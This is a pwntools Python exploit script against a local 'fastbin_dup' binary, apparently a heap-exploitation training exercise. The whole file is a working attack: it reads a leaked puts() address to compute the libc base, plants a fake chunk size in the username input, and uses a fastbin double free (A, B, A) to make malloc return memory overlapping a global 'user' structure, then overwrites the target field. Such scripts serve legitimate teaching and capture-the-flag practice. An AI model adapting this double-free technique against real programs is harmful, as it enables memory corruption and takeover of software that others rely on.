#!/usr/bin/python3
from pwn import *

exe = "./fastbin_dup"
elf = context.binary = ELF(exe, checksec=False)
libc = elf.libc

gs = '''
init-pwndbg
c
'''.format(**locals())

def start(argv=[], *a, **kw):
    if args.GDB:
        context.terminal = ["/mnt/c/wsl-terminal/open-wsl.exe", "-e"]
        return gdb.debug([exe] + argv, gdbscript=gs, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Index of allocated chunks.
index = 0

# Select the "malloc" option; send size & data.
# Returns chunk index.
def malloc(size, data):
    global index
    io.send(b"1")
    io.sendafter(b"size: ", bytes(str(size), 'utf-8'))
    io.sendafter(b"data: ", data)
    io.recvuntil(b"> ")
    index += 1
    return index - 1

# Select the "free" option; send index.
def free(index):
    io.send(b"2")
    io.sendafter(b"index: ", bytes(str(index), 'utf-8'))
    io.recvuntil(b"> ")

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil(b"puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts
io.timeout = 0.1

# create fake chunk (fake size field)
username = b"vi3td0x\x00" + p64(0x31)
io.sendafter(b"username: ", username)
io.recvuntil(b"> ")

# Request two 0x30-sized chunks and fill them with data.
chunk_A = malloc(0x28, b"A"*0x28)
chunk_B = malloc(0x28, b"B"*0x28)

# Free the first chunk, then the second.
free(chunk_A)
free(chunk_B)
free(chunk_A)

# overwrite chunk_A's fd = struct user{username, target}
dup = malloc(0x28, p64(elf.sym.user))

malloc(0x28, b'V')
malloc(0x28, b'V')
# overlap target data
malloc(0x28, b'IgotTheTarget')

io.interactive()